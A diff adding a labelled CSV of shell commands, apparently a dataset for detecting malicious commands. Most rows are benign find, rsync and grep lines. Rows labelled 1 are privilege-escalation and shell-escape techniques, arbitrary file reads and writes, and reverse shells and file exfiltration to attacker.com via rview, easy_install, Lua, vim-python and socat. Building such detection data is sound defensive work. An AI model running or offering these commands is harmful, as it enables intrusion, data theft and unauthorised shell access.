@@ -1,0 +1,1000 @@
+,cmd,label
+0,find / -name document -print,0
+1,"find . -name ""*.xml"" -exec grep -HFf <(find . -name ""*.txt"" -printf ""%f\n"") {} \;",0
+2,mkdir mnt point,0
+3,"find . -name ""*.java""",0
+4,"find . -name ""*sub*.cpp""",0
+5,"find /travelphotos -type f -size +200k -not -iname ""*2015*""",0
+6,find /mnt/naspath -name .snapshot -prune -o \( -type f -mtime 0 -print0 \),0
+7,find $dir -mtime -3,0
+8,"find -maxdepth 1 -not -iname ""MyCProgram.c""",0
+9,"read -e -p ""Enter the path to the file: "" -i ""/usr/local/etc/"" FILEPATH",0
+10,ssh-keygen -Hf ~/.ssh/known_hosts,0
+11,"LFILE=file_to_read
+TF=$(mktemp -d)
+echo ""$LFILE"" | cpio -dp $TF
+cat ""$TF/$LFILE""",1
+12,"find . ! -name ""*photo*""",0
+13,find . -type f -print0 | xargs -0 /bin/rm,0
+14,"find . -iname ""*linkin park*"" -exec cp -r {} /Users/tommye/Desktop/LP \;",0
+15,"find $DIR -type f -iname ""*.$TYPE""",0
+16,"find -L /path/to/dir/* -printf ""%TY%Tm%Td%TH%TM%TS|%p\n""",0
+17,"find . -name ""Linkin Park*""",0
+18,"read -r -p ""${1:-Are you sure? [y/N]} "" response",0
+19,"find . -name ""*.java"" -exec cp {} {}.bk \;",0
+20,cat whatever | egrep 'snozzberries|$',0
+21,"find . -type f -iname \*.html -exec grep -s ""Web sites"" {} \;",0
+22,lftp -c '!/bin/sh',1
+23,ifconfig eth0 | grep inet | cut -d: -f2 | cut -d' ' -f1,0
+24,mount -oremount /,0
+25,"architecture=""$(uname -m)""",0
+26,find / \( -type d -a -perm -777 \) -print,0
+27,output=$(echo $input | fold -w4 | tac | tr -d \\n),0
+28,read -a arr,0
+29,find . -user aluno1 -exec chown aluno2 {},0
+30,"ssh ""$1"" -l pete",0
+31,grep  $USER file |nl,0
+32,find . -name '*my key phrase*',0
+33,pstree -p | grep git,0
+34,touch -d '30 August 2013' *.php,0
+35,sudo find . -name test1.h,0
+36,find /media/Movies -type f -mtime -30 -exec ln -s {} /media/Movies/New/ \;,0
+37,comm -12  <(ls 1) <(ls 2),0
+38,"find folder1/ -depth -type f -printf ""%d\t%p\n""",0
+39,find / -name myfile -type f -print,0
+40,find /home/user -name '*.txt' | xargs cp -av --target-directory=/home/backup/ --parents,0
+41,find . -name \*.php -type f,0
+42,find /somelocation/log_output -type f -ctime +40 -exec ls -l {} \;,0
+43,"find . -type d -exec chmod ug=rwx,o= {} \;",0
+44,rm /var/www/html/**/_* /var/www/html/**/.DS_Store,0
+45,find . -name \? -mtime +0,0
+46,find /home/david -mmin -10 -name '*.c',0
+47,find $HOME/. -name *.txt -ok rm {} \;,0
+48,top -bn1 | grep zombie,0
+49,"find . -name ""*.rb"" -or -name ""*.py""",0
+50,/usr/bin/find $*,0
+51,"LFILE=file_to_write
+ltrace -s 999 -o $LFILE ltrace -F DATA",1
+52,find -x . -type f -print0,0
+53,"LFILE=file_to_write
+echo ""DATA"" | dd of=$LFILE",1
+54,find ~ -type f -name test-a -execdir mv {} test-10 \;,0
+55,"LFILE=file_to_write
+busybox sh -c 'echo ""DATA"" > $LFILE'",1
+56,"find /user/directory/* -name ""*txt"" -mtime 0 -type f",0
+57,"find kat -type f \( -name ""*~"" -p -name ""*.bak"" \) -delete",0
+58,dig -f /path/to/host-list.txt,0
+59,find . -atime -15,0
+60,find /etc -type l,0
+61,date -d @1267619929,0
+62,find -mtime +0 -mtime -1,0
+63,"lualatex -shell-escape '\documentclass{article}\begin{document}\directlua{os.execute(""/bin/sh"")}\end{document}'",1
+64,"find . -name ""*.pdf"" -exec rm {} \;",0
+65,info -O gawk,0
+66,"sort -u -t : -k 1,1 -k 3,3 test.txt",0
+67,find . -name CVS -prune -o -exec mv '{}' `echo {} | tr '[A-Z]' '[a-z]'` \; -print,0
+68,echo t1_t2_t3_tn1_tn2.sh | rev | cut -d_ -f3- | rev,0
+69,mkdir -p /tmp/test/blah/oops/something,0
+70,"LFILE=file_to_delete
+c99 -xc /dev/null -o $LFILE",1
+71,find . -name something -exec ls -l {} \;,0
+72,find / -perm 2644,0
+73,sudo rsync -pgodt /home/ /newhome/,0
+74,find . -name \*.php -type f -print0 | xargs -0 grep -Hn '$test',0
+75,sort file | uniq | cut -f1 -d' ' | uniq -c | rev,0
+76,"mkdir $(seq -f ""$HOME/Labs/lab4a/folder%03g"" 3)",0
+77,jobs -p | xargs kill -9,0
+78,"apt changelog apt
+!/bin/sh",1
+79,"export LFILE=file_to_read
+dotnet fsi
+System.IO.File.ReadAllText(System.Environment.GetEnvironmentVariable(""LFILE""));;",1
+80,find . -size 2000k -print,0
+81,find 'Test Folder' -type d -print0 | xargs -0 rm -rf,0
+82,find . | xargs wc -l,0
+83,find /usr/bin -name [ef]*x,0
+84,find . -size +100M -exec ls -s {} \;,0
+85,"rsync -zvr --include=""*.sh"" --exclude=""*"" $from/*  root@$host:/home/tmp/",0
+86,find /etc -size +100k,0
+87,find . -name photo\?.jpg,0
+88,"LFILE=file_to_read
+tail -c1G ""$LFILE""",1
+89,"find ./music -name ""*.mp3"" -print0 | xargs -0 ls",0
+90,"LFILE=file_to_write
+echo ""DATA"" | iconv -f 8859_1 -t 8859_1 -o ""$LFILE""",1
+91,rsync -av /path/to/files user@targethost:/path,0
+92,"join -t, in1 in2",0
+93,"find / -type f -name ""*"" -newermt ""$newerthan"" ! -newermt ""$olderthan"" -printf ""%T+\t%p\n"" | sort",0
+94,"vimdiff
+:set shell=/bin/sh
+:shell",1
+95,"find /fss/fin -d 1 -type d -name ""*"" -print",0
+96,grep -Ff list1.txt list2.txt | sort | uniq -c | sort -n | tail -n1,0
+97,find ~/Images/Screenshots -size +500k -iname '*.jpg',0
+98,find --version,0
+99,"find . -type d -empty -exec rmdir ""{}"" \;",0
+100,shopt -s expand_aliases extglob xpg_echo,0
+101,find ~ -mmin -90,0
+102,$ tar xvfJ filename.tar.xz,0
+103,find -mindepth 3 -type d -path '*/p/*' -prune -o -name c -print,0
+104,yes 'c=(╱ ╲);printf ${c[RANDOM%2]}'|bash,0
+105,rsync -rvv --recursive /path/to/data/myappdata user@host:/remote/path/to/data/newdirname,0
+106,sudo chown -R `whoami` /usr/local,0
+107,yes 123456789 | head -2,0
+108,"find /home/mine -iname ""*.png"" -execdir cp {} /home/mine/pngcoppies/copy{} \;",0
+109,"find . -name ""*bash*"" | xargs",0
+110,"ls -m | tr -d ' ' | tr ',' ';'",0
+111,find .  -mindepth 1 -type f,0
+112,find . -name '*.pl' | xargs grep -L '^use strict',0
+113,"ssh user@server ""${SSH_COMMAND}""",0
+114,"match=$(echo ""${line}"" | egrep -o 'run-parts (-{1,2}\S+ )*\S+')",0
+115,"LFILE=file_to_read
+/usr/sbin/sysctl -n ""/../../$LFILE""",1
+116,sort,0
+117,"find ""`pwd`"" -type f",0
+118,"history -s ""$line""",0
+119,"diff ""$source_file"" ""$dest_file""",0
+120,find / -size 2048c,0
+121,"export URL=http://attacker.com/file_to_get
+export LFILE=file_to_save
+julia -e 'download(ENV[""URL""], ENV[""LFILE""])'",1
+122,"find . -type f -name ""*.jpg"" -print0 | xargs -0 rename ""s/Image_200x200_(\d{3})/img/""",0
+123,"find  / -type d -iname ""project.images"" -ls",0
+124,tr  ' ' '-',0
+125,find /path/to/search -user owner,0
+126,find $HOME -mtime +365,0
+127,"echo ""$b"" | grep --only-matching ""[$a]"" | xargs | tr --delete ' '",0
+128,rsync -rvv *.txt user@remote.machine:/tmp/newdir/,0
+129,find /dir/to/search -path '*/.*' -print,0
+130,split -b 10M -d  system.log system_split.log,0
+131,"echo 'your, text, here' | fold -sw 70",0
+132,gcore $PID,1
+133,"find /store/01 -name ""*.fits"" -exec chmod -x+r {} \; \",0
+134,"export CMD=""/bin/sh""
+php -r 'print(shell_exec(getenv(""CMD"")));'",1
+135,find . -name '*.orig'  -exec echo {} \ ;,0
+136,find ~ -type f -mtime 0 -ls,0
+137,find . -name filename.txt,0
+138,"ln -s ""/cygdrive/c/Program Files"" /cygdrive/c/ProgramFiles",0
+139,"find . -name ""*.andnav"" | rename -vn ""s/\.andnav$/.tile/""",0
+140,find . -type f \( -iname “*.c” \) |grep -i -r “keyword”,0
+141,"find . -name ""*.swp""-exec rm -rf {} \;",0
+142,find . -name '*1234.56789*',0
+143,"cd ""$(find . -print0 | sort -z | tr '\0' '\n' | tail -1)""",0
+144,mv file0001.txt 1.txt,0
+145,"find / -iname ""*.mp3"" -type f -exec /bin/mv {} /mnt/mp3 \;",0
+146,sort ports.txt | uniq -c | sort -r,0
+147,cat ips | xargs -n1 echo ping -c 2,0
+148,find . -type f  -perm a=rwx -exec ls -l {} \;,0
+149,"find ../../$name-module -print0 -name 'Name*' -type f | xargs -0 rename ""s/Name/$Name/""",0
+150,find  -mtime -1,0
+151,find . -name .git  -prune -o -name file  -print,0
+152,find /home -type f -mtime +90 -mtime -100  -exec rm  {} \;,0
+153,"find . \( -iname ""*.png"" -o -iname ""*.jpg"" \) -print -exec tar -rf images.tar {} \;",0
+154,"LFILE=file_to_read
+tmux -f $LFILE",1
+155,find . -perm /u=s,0
+156,find -empty -type -f,0
+157,"LFILE=file_to_read
+gawk '//' ""$LFILE""",1
+158,"LFILE_DIR=/root
+LFILE_NAME=file_to_write
+
+echo 'data' > data_to_write
+
+TF=$(mktemp)
+cat > $TF <<EOF
+<volume type='file'>
+  <name>y</name>
+  <key>$LFILE_DIR/$LFILE_NAME</key>
+  <source>
+  </source>
+  <capacity unit='bytes'>5</capacity>
+  <allocation unit='bytes'>4096</allocation>
+  <physical unit='bytes'>5</physical>
+  <target>
+    <path>$LFILE_DIR/$LFILE_NAME</path>
+    <format type='raw'/>
+    <permissions>
+      <mode>0600</mode>
+      <owner>0</owner>
+      <group>0</group>
+    </permissions>
+  </target>
+</volume>
+EOF
+
+virsh -c qemu:///system pool-create-as x dir --target $LFILE_DIR
+virsh -c qemu:///system vol-create --pool x --file $TF
+virsh -c qemu:///system vol-upload --pool x $LFILE_DIR/$LFILE_NAME data_to_write
+virsh -c qemu:///system pool-destroy x",1
+159,$(cat myfile),0
+160,"tdir=""$(pwd)/$(mktemp -d)""",0
+161,rsync --recursive emptydir/ destination/newdir,0
+162,cat `find . -name '*.foo' -print`,0
+163,find -user jzb,0
+164,"find . -depth -name ""* *"" -execdir rename ""s/ /_/g"" ""{}"" \;",0
+165,"find . -type f -exec grep -l ""word"" {} +",0
+166,"find / -name ""*~"" | grep -v ""/media""",0
+167,crontab -e,0
+168,"find . -type f -iname ""*linkin park*"" | cpio -pvdmu /Users/tommye/Desktop/LP",0
+169,rsync -rtuv /path/to/dir_a/* /path/to/dir_b,0
+170,find Symfony -type f,0
+171,find ./ -depth -print | cpio -pvd newdirpathname,0
+172,"find ""$DIR"" -type f -mtime +15 -exec rm {} \;",0
+173,find ~ -type f -mtime 0,0
+174,cabal exec -- /bin/sh,1
+175,comm -13 <(sort first.txt) <(sort second.txt),0
+176,"FOLDERS=$(find . -type d | paste -d, -s)",0
+177,find . -depth -name '__temp__*' -exec rm -rf '{}' \;,0
+178,"find . -maxdepth 1 -name ""*.pdf"" -print0 | xargs -0 rm",0
+179,find / -dev -size +3000 -exec ls -l {} ;,0
+180,"find /var/log/apache2/access*.gz -type f -newer ./tmpoldfile ! -newer ./tmpnewfile \ | xargs zcat | grep -E ""$MONTH\/$YEAR.*GET.*ad=$ADVERTISER HTTP\/1"" -c",0
+181,"join -j1 -o 2.1,2.2,1.2,1.3  <(sort test.1) <(sort test.2)",0
+182,find ./ -mount -depth -print | cpio -pdm /destination_dir,0
+183,find . -name libEGL* | xargs rm -f,0
+184,"tree -dfi -L 1 ""$(pwd)""",0
+185,find /home -type f -exec file {} \;,0
+186,"find /path/to/dir -type f -print0 | xargs -0 grep -l ""foo""",0
+187,"find . -name .git -prune -o -print | xargs grep ""string-to-search""",0
+188,"LFILE=file_to_write
+mawk -v LFILE=$LFILE 'BEGIN { print ""DATA"" > LFILE }'",1
+189,"find ./ -follow -lname ""*""",0
+190,"find /usr -name ""Chapter*"" -type f",0
+191,grep -o . file | sort | uniq -c,0
+192,echo dir1 dir2 dir3 | xargs -n 1 cp file1,0
+193,find / -name foo.txt,0
+194,"LFILE=file_to_read
+xxd ""$LFILE"" | xxd -r",1
+195,ls -ald `which c++`,0
+196,find image-folder/ -type f,0
+197,find /etc -name '*.conf',0
+198,"rsync -auve ""ssh -p 2222"" . me@localhost:/some/path",0
+199,find . -maxdepth 1 -type f,0
+200,rsync -a --delete blanktest/ test/,0
+201,find -delete,0
+202,find . -mtime +10 -print,0
+203,"find /Applications -type d -name ""*.app""",0
+204,find /var/adm -mtime +3 -print,0
+205,find / -mmin -60,0
+206,cat set1 set2 | sort -u,0
+207,"finger -l | grep ""Name:"" | cut -d "":"" -f 3 | cut -c 2- | sort | uniq",0
+208,"find .  -type f -name ""* *""",0
+209,which bzip2,0
+210,find . -group flossblog -type f,0
+211,find dir_to_start -name dir_to_exclude -prune -o -print0 | xargs -0 chown owner,0
+212,dig +short -f list,0
+213,"less file_to_write
+v",1
+214,"find . -iname ""*.mov"" -printf ""%p %f\n""",0
+215,echo -n -e '\x61' | md5sum,0
+216,find . -perm -a+r -perm /a+w ! -perm /a+x,0
+217,find / -type f ! -perm 644,0
+218,find /srv/abc/ -type d -empty -exec rmdir {} \;,0
+219,find /data -type f -perm 400,0
+220,find / -name filedir,0
+221,"echo $(basename ""$1"")",0
+222,chmod -R 755 /directory,0
+223,find . -daystart -mtime -1 -ls,0
+224,"sudo find / -type d -name ""postgis-2.0.0""",0
+225,find $ARCH1 -ls,0
+226,mkdir subdirectory,0
+227,find /usr -name '*.foo' -print,0
+228,find . -iname *.txt -exec egrep mystring \{\} \;,0
+229,ssh-keygen -f outfile -N '',0
+230,value=$(uname -r),0
+231,ls -1 | tail -n +N | head -n1,0
+232,path=$(basename $(pwd) | tr 'A-Z' 'a-z' ),0
+233,sudo chown `whoami` /data/db,0
+234,find -L $path -maxdepth 1 -type l,0
+235,find /myfiles -type l,0
+236,"find -maxdepth 1 -iname ""*.txt""",0
+237,env - `cat ~/cronenv` /bin/sh,0
+238,find . -size 100M,0
+239,find . -mindepth 2 -maxdepth 2 -type d -ls,0
+240,find -maxdepth 1 -type f -printf '%f\000',0
+241,find . -mnewer poop,0
+242,find / -name foo.bar -print,0
+243,"find /home/wsuNID/ -name ""*.txt""",0
+244,find -type d -name a -exec rmdir {} \;,0
+245,find . -type f -exec chmod 500 {} ';',0
+246,"find -regex ""$rx""",0
+247,echo $(basename $(readlink -nf $0)),0
+248,"git help config
+!/bin/sh",1
+249,find . -mmin -60 | xargs -r ls -ld,0
+250,"find . -name ""*.swp""",0
+251,find -mtime +7 -print | grep -Fxvf file.lst,0
+252,mkdir destdir,0
+253,DIR=`pwd`/`dirname $0`,0
+254,find . -type f -size +2G,0
+255,"echo -ne ""Welcome $(whoami)!\n""",0
+256,"find . -type f -exec grep ""foo"" '{}' \;",0
+257,sudo mkdir /data/db,0
+258,"grep -r ""texthere"" .",0
+259,cat -n,0
+260,MERGE=$(cat $COMMIT_EDITMSG|grep -i 'merge'|wc -l),0
+261,"vi
+:set shell=/bin/sh
+:shell",1
+262,find /home/user/Maildir/.SPAM/cur -type f -exec rm -f '{}' '+',0
+263,"awk 'BEGIN {system(""/bin/sh"")}'",1
+264,find path_to_dir -type d,0
+265,find /data/images -newer /tmp/foo,0
+266,find /etc -size +5M -exec ls -sh {} +,0
+267,find . -type f -exec chmod 775 {} +,0
+268,"find / -type f -printf ""\n%Ab %p"" | head -n 11 | sort -k1M",0
+269,"find . ! \( -name ""*.exe"" -o -name ""*.dll"" \)",0
+270,diff PATH1/ PATH2/ -rq -X file1,0
+271,find /mount/point -maxdepth 1 -type d | wc -l,0
+272,"mount -L WHITE /mnt/WHITE -o rw,uid=test,gid=test",0
+273,find / -name Chapter1 -type f -print,0
+274,"export URL=http://attacker.com/
+export LFILE=file_to_send
+view -c ':py import vim,sys; from os import environ as e
+if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u
+else: import urllib as u, urllib2 as r
+r.urlopen(e[""URL""], bytes(u.urlencode({""d"":open(e[""LFILE""]).read()}).encode()))
+vim.command("":q!"")'",1
+275,"read -p ""Are you sure? (y/n) "" -n 1",0
+276,"find . -name ""*~"" -delete",0
+277,find /path/to/folders/ -name \*.emlx -print0 | xargs -0 -I {} mv {} ./Messages/,0
+278,find . -size +10c -print,0
+279,find / -size +900M,0
+280,find /home -type f -name test.txt -exec rm -f {} \,0
+281,find . -uid 0 -print,0
+282,find . -name PERSONAL -prune -o -print,0
+283,sudo chown $(whoami):$(whoami) /usr/local/rvm/gems/ruby-2.0.0-p481/ -R,0
+284,"find ""$STORAGEFOLDER"" -name .todo -printf '%h\n'",0
+285,find /usr/bin -type f -atime +100,0
+286,find . -size +1M -ok mv {} files \+,0
+287,find . -name '*.[ch]' | xargs grep -E 'expr',0
+288,find . -type d -name aa,0
+289,history 10,0
+290,find /home/bozo/projects -mtime 1,0
+291,/usr/bin/time /bin/sh,1
+292,comm -12 <(sort file1.txt) <(sort file2.txt) | wc -l,0
+293,"export RHOST=attacker.com
+export RPORT=12345
+rview -c ':py import vim,sys,socket,os,pty;s=socket.socket()
+s.connect((os.getenv(""RHOST""),int(os.getenv(""RPORT""))))
+[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
+pty.spawn(""/bin/sh"")
+vim.command("":q!"")'",1
+294,directories=$(diff -qr directory directory.original | cut -d' ' -f2 | xargs dirname | uniq),0
+295,"find . -type f -name ""*cache.html"" -exec gzip -k {} \;",0
+296,"full_f=""$(which f)""",0
+297,find . -mindepth 1 -maxdepth 1 -type d,0
+298,"grep -o ""_foo_"" <(paste -sd_ file) | tr -d '_'",0
+299,find ~ -type f -exec file -i {} + | grep video,0
+300,"find . -name "".*\.i""",0
+301,ls -tp | grep -v '/$' | tail -n +6 | xargs -d '\n' rm --,0
+302,find -type f -name 'header.php' | xargs -n 1 dirname | xargs -n 1 cp -f topscripts.php,0
+303,"yes ""$OPTARG"" | head -$opt",0
+304,"find ./ -type f -name ""*.php""  | xargs -r rename ""s/php/html/""",0
+305,find . -name '*.js',0
+306,$dig -x 8.8.8.8 | grep  PTR | grep -o google.*,0
+307,"find \( -name 'messages.*' ! -path ""*/.svn/*"" ! -path ""*/CVS/*"" \) -exec grep -Iw uint {} +",0
+308,find -type f |  grep -P '\w+-\d+x\d+\.\w+$' | xargs rm,0
+309,find . -name \*.log -print0 | xargs -I{} -0 cp -v {} /tmp/log-files,0
+310,rsync -aP --include=*/ --include=*.txt --exclude=* . /path/to/dest,0
+311,"find ./ -name ""*sub*""",0
+312,find ~ -type f -mmin -90,0
+313,cp -n,0
+314,"find . -printf ""%i \n""",0
+315,rsync -av --progress --exclude=*.VOB --exclude=*.avi --exclude=*.mkv --exclude=*.ts --exclude=*.mpg --exclude=*.iso --exclude=*ar --exclude=*.vob --exclude=*.BUP --exclude=*.cdi --exclude=*.ISO --exclude=*.shn --exclude=*.MPG --exclude=*.AVI --exclude=*.DAT --exclude=*.img --exclude=*.nrg --exclude=*.cdr --exclude=*.bin --exclude=*.MOV --exclude=*.goutputs* --exclude=*.flv --exclude=*.mov --exclude=*.m2ts --exclude=*.cdg --exclude=*.IFO --exclude=*.asf --exclude=*.ite /media/2TB\ Data/data/music/* /media/wd/network_sync/music/,0
+316,du -sb,0
+317,find -L /home/peter -name *~ |xargs rm,0
+318,find /home -name Trash -exec rm {} \;,0
+319,find /proc | xargs,0
+320,"find /var/log -group adm -name ""*.log""",0
+321,cut -d: -f1 /etc/group | sort,0
+322,cat my_script.py,0
+323,find -type f -print0,0
+324,find $HOME/. -name *.txt -exec head -n 1 -v {} \;,0
+325,paste -s -d' \n' input.txt,0
+326,"CDATE=$( date -d @""$timestamp"" +""%Y-%m-%d %H:%M:%S"" )",0
+327,shopt -s extglob,0
+328,find /nas -type d -ls,0
+329,find /usr/src -name '*.c' -size +100k -print,0
+330,find -type f -exec du -Sh {} + | sort -rh | head -n 5,0
+331,"TF=$(mktemp)
+echo ""From nobody@localhost $(date)"" > $TF
+mail -f $TF
+!/bin/sh",1
+332,tree --help |& head -n2,0
+333,"grep -inr ""Text"" folder/to/be/searched/",0
+334,find -L . -type f \( -perm -u=x -o -perm -g=x -o -perm -o=x \),0
+335,ln -s $(readlink -f $origlink) $newlink,0
+336,find / -name 'my*',0
+337,find . -size +300M,0
+338,"find ""$some_directory"" -type f -name '.*' -exec rm '{}' \;",0
+339,find ./ -type f \( -name '*.r*' -o -name '*.c*' \) -print,0
+340,find . -inum 782263 -exec rm -i {} \;,0
+341,ssh -p 4444 localhost,0
+342,find /usr/tom | egrep '*.pl| *.pm',0
+343,"find . -name ""*.c"" | xargs -n3",0
+344,find /path ! -perm /020,0
+345,"LFILE=file_to_read
+ksshell -i $LFILE",1
+346,"sudo mount -i -o remount,suid /home/evgeny",0
+347,find bla -name *.so -print0 | sort -rz,0
+348,groups $USERNAME | cut -d\  -f 1,0
+349,find . -type f -print | xargs -L1 wc -l,0
+350,"join -1 2 -2 1 -a1 <(cat -n file1.txt | sort -k2,2) <(sort file2.txt) | sort -k2 | cut --complement -d"" "" -f2",0
+351,"find . -type d -name "".*""",0
+352,find / -links -2 -print,0
+353,"find . -name ""*.rb"" -type f -exec wc -l \{\} \;",0
+354,env | grep ^PATH,0
+355,find $@ -not -name ss,0
+356,seq 1 10 | sort -R | tee /tmp/lst |cat <(cat /tmp/lst) <(echo '-------') \ <(tac),0
+357,"find . \! -path ""./.git*"" -a \! -name states_to_csv.pl",0
+358,echo Hello world | od -t x1 -t c,0
+359,find . -type d –print | wc -l,0
+360,"find . -type f -name ""*.jpg""",0
+361,cat file | fold -w29,0
+362,"export RHOST=attacker.com
+export RPORT=12345
+TF=$(mktemp -d)
+echo 'import sys,socket,os,pty;s=socket.socket()
+s.connect((os.getenv(""RHOST""),int(os.getenv(""RPORT""))))
+[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
+pty.spawn(""/bin/sh"")' > $TF/setup.py
+easy_install $TF",1
+363,top -b -n1 -c,0
+364,find -L /usr/ports/packages -type l -exec rm -- {}	+,0
+365,"ruby -e 'exec ""/bin/sh""'",1
+366,split,0
+367,find . | xargs grep 'word' -sl,0
+368,find $1/.hg -type d -exec chmod g+s {} \;,0
+369,"find working -type f -name ""*.mp4"" | head -1",0
+370,"find . -name ""*bills*"" -print0 | xargs -0 grep put",0
+371,"grep -v ""#"" -R  /var/spool/cron/tabs",0
+372,find . -user tommye,0
+373,dig -x 72.51.34.34,0
+374,find . -type f -exec ls -s {} \; | sort -n -r | head -5,0
+375,chown root:root it,0
+376,find -inum 752010 -exec rm {} \;,0
+377,find directory_name -type f -print0 | xargs -0 grep -li word,0
+378,"RHOST=attacker.com
+RPORT=12345
+LFILE=file_to_send
+lua -e '
+  local f=io.open(os.getenv(""LFILE""), 'rb')
+  local d=f:read(""*a"")
+  io.close(f);
+  local s=require(""socket"");
+  local t=assert(s.tcp());
+  t:connect(os.getenv(""RHOST""),os.getenv(""RPORT""));
+  t:send(d);
+  t:close();'",1
+379,find -type f -ctime +14,0
+380,rsync /path/to/local/storage user@remote.host:/path/to/copy,0
+381,"ls -alFt `find . -name ""bla.txt""` | rev | cut -d"" "" -f1 | rev | head -1",0
+382,find . -type f -maxdepth 1 -not -empty -print0 | xargs -0i cp /dev/null {},0
+383,"find /home/backups -printf ""%T@ %p\n"" | sort -n | head -1 | cut -d"" "" -f2- | xargs ls -al",0
+384,find -user root -exec chown www-data {} \;,0
+385,ls -1 /tmp/hashmap.$1,0
+386,"sudo echo ""deb http://downloads-distro.mongodb.org/repo/ubuntu-upstart dist 10gen"" | sudo tee -a /etc/apt/sources.list.d/10gen.list",0
+387,find . -type d -exec chmod 2775 {} \;,0
+388,find teste1 teste2 -type f -exec md5 -r {} \; | sort,0
+389,"find . -type f -exec chmod u=rw,g=r,o= '{}' \;",0
+390,"rmdir ""$(dirname $(dirname $dir))""",0
+391,"LPORT=12345
+socket -svp '/bin/sh -i' $LPORT",1
+392,find . -name '*.txt',0
+393,find . -name '*.js' -\! -name 'glob-for-excluded-dir' -prune,0
+394,find . -name '*' -exec file {} \; | grep -o -P '^.+: \w+ image',0
+395,env -i ./makeall.sh,0
+396,find -type d -exec find {} -maxdepth 1 \! -type d -iname '.note' \;,0
+397,find . -type d -maxdepth 1 -empty -delete,0
+398,find . \( -type d ! -name . -prune \) -o \( -mtime -1 -print \),0
+399,"find .  -name ""*.txt"" -type f -daystart -mtime -91 -mtime +2 | xargs cat | sort | uniq",0
+400,"find /tmp -name ""*.tmp"" -print0 | xargs -0 rm   find /tmp -name ""*.tmp"" -print0 | xargs -0 rm",0
+401,mount -t cpuset none /cpuset/,0
+402,find images/ -type f,0
+403,"ex
+!/bin/sh",1
+404,jobs -lp,0
+405,find . -name '*.log' -mtime -2 -exec grep -Hc Exception {} \; | grep -v :0$,0
+406,file utf8.txt,0
+407,"echo ""$string"" | nl -ba -s') '",0
+408,find / -path /proc -prune -o -perm -2 ! -type l -ls,0
+409,"cd `echo -n ""~""`",0
+410,find . -type f -name tecmint.php,0
+411,find ./dir1 -type f -exec basename {} \;,0
+412,"find . -regextype sed -regex "".*/[a-f0-9\-]\{36\}\.jpg""",0
+413,find . -iname CVS -type d | xargs rm -rf,0
+414,find / -type f -perm -002,0
+415,gunzip -c myarchive.tar.gz | tar -tvf -,0
+416,"find -name ""<fileName>""",0
+417,"echo ""aaaa eeee bbbb ffff cccc""|tr ' ' '\n'|tac|tr '\n' ' '",0
+418,find / -user syslog,0
+419,sort -b -n -k2.4 table,0
+420,find . -type f -name '*.php' -exec chmod 644 {} \;,0
+421,bzip2 *,0
+422,find ./ -type d -name 'D',0
+423,cut -d\  -f 2,0
+424,find . -type d | xargs rmdir,0
+425,ls -d ./*/                     ### more reliable BSD ls,0
+426,find / -fstype ext2 -name document -print,0
+427,split --lines $lines_per_file complete.out,0
+428,find /home/testuser/log/ -mtime +1 | xargs  tar -czvPf  /opt/older_log_$(date +%F).tar.gz,0
+429,"basename ""$FILE"" | cut -d'.' -f-1",0
+430,find . -mmin 60 -type f,0
+431,"ifconfig en0 | grep -o -E '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}'",0
+432,yes 1 | nl | tee /tmp/to,0
+433,find . -type f -exec chmod 0644 {} +,0
+434,df -ih,0
+435,sudo find /var/www/some/subset -type d -print0 | xargs -0 chmod g+s,0
+436,"df -h $path | cut -f 1 -d "" "" | tail -1",0
+437,"find ""$d"" -prune -empty -type d",0
+438,find /mydir1 /mydir2 -size +2000 -atime +30 -print,0
+439,"echo ""Your string here""| tr ' ' '\n' | tail -n1",0
+440,find . -name photoA.jpg photoB.jpg photoC.jpg,0
+441,"find . -print | xargs grep -l -i ""PATTERN""",0
+442,"find /tmp/ -ctime -1 -name ""x*"" | xargs -I '{}' mv '{}' ~/play/",0
+443,"find /etc -name ""*.txt"" | xargs ls -l",0
+444,find / -empty,0
+445,find . -type f print0 | sort -r,0
+446,"find ""$dir"" -type f",0
+447,find /directory -newermt $(date +%Y-%m-%d -d '1 day ago') -type f -print,0
+448,find -name 'catalina*',0
+449,"find . -type d -name ""0"" -execdir tar -cvf filename.tar RS* \;",0
+450,"find . -regextype posix-egrep -regex "".+\.(c|cpp|h)$"" -print0 | xargs -0 -n 1 ls",0
+451,find . -type f -iname *.m4a -print,0
+452,"read -p ""Are you sure you wish to continue?""",0
+453,"find . -iname ""$srch*"" -exec grep ""Processed Files"" {} \; -print",0
+454,rm -f /tmp/stored_exception /tmp/stored_exception_line /tmp/stored_exception_source,0
+455,sed e,1
+456,ls -alR -I dev -I run -I sys -I tmp -I proc /path | md5sum -c /tmp/file,0
+457,"find . -name ""*.java"" -print0 | xargs -0 wc",0
+458,find /opt/lampp/htdocs -type d -exec chmod 755 {} \;,0
+459,join -v1 success.txt fail.txt,0
+460,find . -name 'a(b*' -print,0
+461,find . -name '*.gz' ! -name '*dvportgroups*' ! -name '*nsanity*' ! -name '*vcsupport*' ! -name '*viclient*' ! -name 'vsantraces*' -exec gunzip -vf {} \;,0
+462,ln -sfn newDir currentDir,0
+463,echo `date -v-1d +%F`,0
+464,find . -name foo -type d -prune -o -name foo -print,0
+465,sort foo.txt,0
+466,find /tmp -mtime +30 -print,0
+467,chown --reference=oldfile newfile,0
+468,find /tmp -iname '*.mp3' -print0 | xargs -0 rm,0
+469,reads=$(zcat $file.fastq),0
+470,"find /user/directory/ -name ""*txt"" -mtime 0 -type f -printf '%p: ' -exec tail -1 {} \;",0
+471,"find . -name ""*.php"" -exec chmod 755 {} \;",0
+472,RM=`which rm`,0
+473,"find /data/ -name 'command-*-setup' | sort -t - -V -k 2,2",0
+474,"grep -ao ""[/\\]"" /dev/urandom|tr -d \\n",0
+475,"find /var/www/ -type f -iname ""*.pl"" -print",0
+476,"find /home/user1 -name ""*.bin""",0
+477,find . -name .svn -exec rm -rf '{}' \;,0
+478,find /path/subfolder -maxdepth 1 -type f -name '*' -exec mv -n {} /path \;,0
+479,bg %,0
+480,grep -l 'Subject: \[SPAM\]' | xargs -I '{}' mv '{}' DIR,0
+481,"RHOST=attacker.com
+RPORT=12345
+LFILE=file_to_save
+socat -u tcp-connect:$RHOST:$RPORT open:$LFILE,creat",1
+482,"cd ""$(grep DOWNLOAD $HOME/.config/user-dirs.dirs | cut -f 2 -d ""="" | tr ""\"""" ""\n"")""",0
+483,rsync -av --copy-dirlinks --delete ../htmlguide ~/src/,0
+484,"find /myDir -name ""log*"" -ctime +7 -exec bzip2 -zv {} \;",0
